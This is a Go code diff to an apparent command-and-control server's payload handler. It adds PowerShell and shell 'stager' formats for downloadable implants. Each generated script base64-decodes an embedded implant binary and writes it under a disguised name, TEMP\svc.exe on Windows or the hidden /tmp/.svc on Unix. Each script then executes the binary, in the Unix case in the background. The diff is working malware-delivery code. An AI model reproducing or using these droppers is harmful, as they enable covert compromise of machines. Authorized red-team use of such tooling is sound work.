@@ -2,6 +2,7 @@ package httpapi
 
 import (
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -153,23 +154,33 @@ func (ph *payloadHandler) handlePayloadDetail(w http.ResponseWriter, r *http.Req
 				return
 			}
 			ext := ""
-			switch payload.TargetOS {
-			case "windows":
-				switch payload.Format {
-				case "dll":
-					ext = ".dll"
-				case "shellcode":
-					ext = ".bin"
-				default:
-					ext = ".exe"
-				}
+			contentType := "application/octet-stream"
+			switch payload.Format {
+			case "ps1":
+				ext = ".ps1"
+				contentType = "text/plain"
+			case "sh":
+				ext = ".sh"
+				contentType = "text/plain"
 			default:
-				if payload.Format == "shared" {
-					ext = ".so"
+				switch payload.TargetOS {
+				case "windows":
+					switch payload.Format {
+					case "dll":
+						ext = ".dll"
+					case "shellcode":
+						ext = ".bin"
+					default:
+						ext = ".exe"
+					}
+				default:
+					if payload.Format == "shared" {
+						ext = ".so"
+					}
 				}
 			}
 			filename := fmt.Sprintf("implant-%s-%s%s", payload.TargetOS, payload.TargetArch, ext)
-			w.Header().Set("Content-Type", "application/octet-stream")
+			w.Header().Set("Content-Type", contentType)
 			w.Header().Set("Content-Disposition", "attachment; filename=\""+filename+"\"")
 			w.Header().Set("Content-Length", strconv.Itoa(len(payload.BinaryData)))
 			w.Write(payload.BinaryData)
@@ -240,6 +251,17 @@ func buildImplant(db *gorm.DB, base models.PayloadArtifact, goos, goarch string)
 	binData, err := os.ReadFile(outPath)
 	if err != nil {
 		return nil, fmt.Errorf("read binary: %w", err)
+	}
+
+	switch base.Format {
+	case "ps1":
+		encoded := base64.StdEncoding.EncodeToString(binData)
+		script := fmt.Sprintf("$b = [Convert]::FromBase64String('%s')\n$p = \"$env:TEMP\\svc.exe\"\n[IO.File]::WriteAllBytes($p, $b)\nStart-Process -FilePath $p\n", encoded)
+		binData = []byte(script)
+	case "sh":
+		encoded := base64.StdEncoding.EncodeToString(binData)
+		script := fmt.Sprintf("#!/bin/sh\npayload='%s'\necho \"$payload\" | { base64 -d 2>/dev/null || base64 -D; } > /tmp/.svc\nchmod +x /tmp/.svc\n/tmp/.svc &\n", encoded)
+		binData = []byte(script)
 	}
 
 	hash := sha256.Sum256(binData)
